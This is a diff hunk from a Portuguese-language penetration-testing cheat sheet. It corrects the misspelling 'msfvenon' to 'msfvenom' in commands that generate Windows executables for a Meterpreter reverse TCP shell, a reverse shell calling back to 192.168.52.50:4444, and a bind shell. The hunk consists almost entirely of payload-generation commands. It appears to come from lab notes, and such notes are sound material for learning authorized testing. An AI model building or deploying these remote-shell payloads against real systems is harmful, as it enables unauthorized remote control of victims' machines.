@@ -27,13 +27,13 @@ sudo ./metasploit.sh
 
 ## Binários Windows
 ```
-msfvenon -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.52.50 LPORT=4444 -f exe -o meterpreter.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.52.50 LPORT=4444 -f exe -o meterpreter.exe
 ```
 ```
-msfvenon -p windows/shell_reverse_tcp LHOST=192.168.52.50 LPORT=4444 -f exe -o shell.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.52.50 LPORT=4444 -f exe -o shell.exe
 ```
 ```
-msfvenon -p windows/shell_bind_tcp RHOST=192.168.52.129 LPORT=4444 -f exe -o bind.exe
+msfvenom -p windows/shell_bind_tcp RHOST=192.168.52.129 LPORT=4444 -f exe -o bind.exe
 ```
 ### Listener no metasploit
 ```
